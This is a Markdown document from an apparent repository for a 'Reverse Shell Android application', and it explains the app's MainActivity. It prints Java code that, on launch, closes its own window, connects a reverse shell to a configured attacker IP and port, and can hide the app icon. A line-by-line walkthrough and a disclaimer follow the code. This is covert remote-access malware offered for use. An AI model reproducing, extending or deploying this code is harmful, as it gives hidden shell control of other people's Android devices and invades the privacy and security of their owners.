# Main Activity for Reverse Shell Android Application

This Markdown file describes the main activity component of the Reverse Shell Android application. The main activity serves as the entry point for the application and handles the initialization and execution of the reverse shell connection.

## Activity Overview

The `MainActivity` class extends the `AppCompatActivity` class provided by the Android framework. It represents the main activity of the application and is responsible for starting the reverse shell connection.

## Code Explanation

```java
package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);
        // new functions(activity).overlayChecker(context);
        // final PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        // mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,TAG);
        // mWakeLock.acquire();
        finish();
        new tcpConnection(activity, context).execute(config.IP, config.port);
        overridePendingTransition(0, 0);
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
    }
}
```

- The `MainActivity` class extends the `AppCompatActivity` class to create an activity component.
- The `activity` variable is initialized with `this`, representing the current activity instance.
- The `context` variable is initialized with the application's `ApplicationContext`.
- The `TAG` variable is a string used for logging purposes.
- The `mWakeLock` variable represents a wake lock to keep the device's screen on (currently commented out).
- The `onCreate` method is overridden and called when the activity is created.
  - The `super.onCreate(savedInstanceState)` method call is used to initialize the activity.
  - The `overridePendingTransition(0, 0)` method call is used to remove any transition animation.
  - The `context` variable is set to the application's `ApplicationContext`.
  - The IP address and port from the `config` class are logged for debugging purposes.
  - The code related to overlay checking and wake lock acquisition is currently commented out.
  - The `finish()` method call is used to finish the activity immediately.
  - An instance of the `tcpConnection` class is created and executed to establish the reverse shell connection using the IP address and port from the `config` class.
  - The `overridePendingTransition(0, 0)` method call is used again to remove any transition animation.
  - If the `icon` flag in the `config` class is `true`, the application icon is hidden using the `functions` class.

## Usage

The `MainActivity` class serves as the entry point for the Reverse Shell Android application. It initializes the necessary components and establishes the reverse shell connection when the application is launched.

## Disclaimer

Please note that the use of this application may be subject to legal restrictions. The repository owner and contributors are not responsible for any misuse or illegal activities conducted with this application. Use it responsibly and ethically.

## License

The source code in this repository is licensed under the [MIT License](LICENSE).
